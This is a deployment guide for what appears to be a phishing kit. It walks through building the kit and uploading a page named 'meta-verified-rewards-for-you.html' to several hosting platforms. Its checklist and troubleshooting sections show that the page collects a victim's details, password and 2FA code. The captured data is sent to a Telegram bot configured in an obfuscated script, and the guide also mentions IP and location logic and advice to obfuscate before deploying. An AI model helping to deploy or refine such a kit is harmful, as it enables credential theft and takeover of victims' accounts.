# Quick deploy guide

## Step 1 — Production build

### Windows

```bash
build.bat
```

### Linux / macOS

```bash
./build.sh
```

### npm

```bash
npm run build
```

Production output is written to `dist/`.

---

## Step 2 — Deploy to your host

### 1. cPanel / traditional hosting

1. Open File Manager in cPanel  
2. Go to `public_html/`  
3. Upload **all** contents of `dist/`:  
   - `meta-verified-rewards-for-you.html`  
   - `index.html`  
   - `public/` (folder)  
4. Open `https://yourdomain.com/` or `https://yourdomain.com/index.html`

### 2. Netlify (free)

**Drag and drop**

1. https://app.netlify.com/drop  
2. Drop the `dist/` folder  
3. You get a free URL  

**CLI**

```bash
npm install -g netlify-cli
netlify login
netlify deploy --dir=dist --prod
```

### 3. Vercel (free)

```bash
npm install -g vercel
vercel login
cd dist
vercel --prod
```

### 4. GitHub Pages (free)

```bash
git init
git add .
git commit -m "Initial commit"
git remote add origin https://github.com/USERNAME/REPO.git
git push -u origin main

git subtree push --prefix dist origin gh-pages
```

Site: `https://USERNAME.github.io/REPO/` or `.../index.html`

### 5. AWS S3 + CloudFront

```bash
aws s3 sync dist/ s3://your-bucket-name/ --delete
```

Enable static website hosting on the bucket; point CloudFront at it.

### 6. Firebase Hosting (free)

```bash
npm install -g firebase-tools
firebase login
firebase init hosting
```

Choose `dist/` as the public directory, then `firebase deploy`.

### 7. DigitalOcean App Platform

1. Push the repo to GitHub  
2. Connect the repo in DigitalOcean  
3. Build command: `npm run build`  
4. Output directory: `dist`  
5. Deploy  

---

## Step 3 — Custom domain (optional)

**Netlify** — Site settings → Domain management → add domain → update DNS.

**Vercel** — Project settings → Domains → add domain → update DNS.

**cPanel** — Domain usually points at `public_html` already.

---

## Deploy checklist

**Before deploy**

- [ ] Production build (`build.bat`)  
- [ ] Tested from `dist/`  
- [ ] Checked Telegram settings in source `public/js/x7a2f9c4.js` (bundled into `bundle-app.js`; see `JS_MANIFEST.txt`)  
- [ ] Tested in multiple browsers  
- [ ] Tested responsive layout  

**After deploy**

- [ ] Live URL loads  
- [ ] No console errors  
- [ ] Forms work  
- [ ] Telegram notifications work  
- [ ] Location / IP logic behaves as expected  

---

## Updating after deploy

1. Edit source (not hand-edited files in `dist/` only)  
2. Rebuild: `build.bat`  
3. Upload the new `dist/` contents  

---

## Platform comparison

| Platform      | Free tier | Custom domain | SSL | CDN | Ease   |
|---------------|-----------|---------------|-----|-----|--------|
| Netlify       | Yes       | Yes           | Yes | Yes | High   |
| Vercel        | Yes       | Yes           | Yes | Yes | High   |
| GitHub Pages  | Yes       | Yes           | Yes | Yes | Good   |
| Firebase      | Yes       | Yes           | Yes | Yes | Good   |
| cPanel        | Varies    | Yes           | Varies | No | Medium |
| AWS S3        | Pay       | Yes           | Yes | Yes | Lower  |

Netlify and Vercel are usually the fastest path for static sites.

---

## Troubleshooting

**Site does not load**

- Check paths in HTML  
- Ensure `public/` was uploaded  
- Check the browser console  

**Telegram messages not received**

- Verify bot token in source `public/js/x7a2f9c4.js`, then rebuild so `dist/public/js/bundle-app.js` includes it  
- Test: `https://api.telegram.org/bot{TOKEN}/getMe`  
- Confirm chat ID  

**CSS / JS not loading**

- Paths should be root-relative `/public/...` (see current `meta-verified-rewards-for-you.html`)  
- Clear cache  
- Confirm files exist on the server  

**Form does not submit**

- DevTools (F12) → Console  
- Walk through: info → password → 2FA  

---

## Security

1. Prefer HTTPS  
2. Obfuscate before production deploy  
3. Do not commit secrets  
4. Rotate Telegram tokens periodically  
5. Review access logs if available  

---

## Support

1. Read **BUILD_GUIDE.md**  
2. Check the browser console  
3. Test `dist/` locally before redeploying  
4. Confirm every file uploaded  

Happy deploying.
